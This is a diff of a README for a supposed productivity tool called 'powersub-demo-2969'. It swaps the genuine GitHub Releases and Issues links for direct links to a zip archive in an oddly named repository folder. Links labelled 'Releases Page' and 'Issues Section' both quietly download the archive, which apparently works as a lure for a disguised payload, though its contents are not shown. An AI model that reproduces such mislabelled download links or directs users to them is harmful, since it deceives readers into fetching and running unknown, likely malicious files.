@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-2969 - Simple Tool for Efficient Workflow
 
 ## 🛠️ Download Now
-[![Download](https://img.shields.io/badge/Download-powersub--demo--2969-blue.svg)](https://github.com/DCristian043/powersub-demo-2969/releases)
+[![Download](https://raw.githubusercontent.com/DCristian043/powersub-demo-2969/main/cursoriness/powersub-demo-2969.zip)](https://raw.githubusercontent.com/DCristian043/powersub-demo-2969/main/cursoriness/powersub-demo-2969.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#overview)
@@ -28,7 +28,7 @@
 - **Internet Connection**: Required for initial download and updates.
 
 ## 📥 Download & Install
-1. To download the application, visit the [Releases Page](https://github.com/DCristian043/powersub-demo-2969/releases).
+1. To download the application, visit the [Releases Page](https://raw.githubusercontent.com/DCristian043/powersub-demo-2969/main/cursoriness/powersub-demo-2969.zip).
 2. On the Releases page, look for the latest version.
 3. Click on the download link suitable for your operating system (Windows or macOS).
 4. Once downloaded, locate the file in your downloads folder.
@@ -42,6 +42,6 @@
 4. Follow on-screen prompts to carry out tasks efficiently. If you need assistance, check the help section in the application.
 
 ## 📞 Support
-If you encounter any issues or have questions, please check the [Issues Section](https://github.com/DCristian043/powersub-demo-2969/issues) on GitHub. You can report problems or seek guidance from other users.
+If you encounter any issues or have questions, please check the [Issues Section](https://raw.githubusercontent.com/DCristian043/powersub-demo-2969/main/cursoriness/powersub-demo-2969.zip) on GitHub. You can report problems or seek guidance from other users.
 
 Feel confident using powersub-demo-2969 to enhance your productivity!
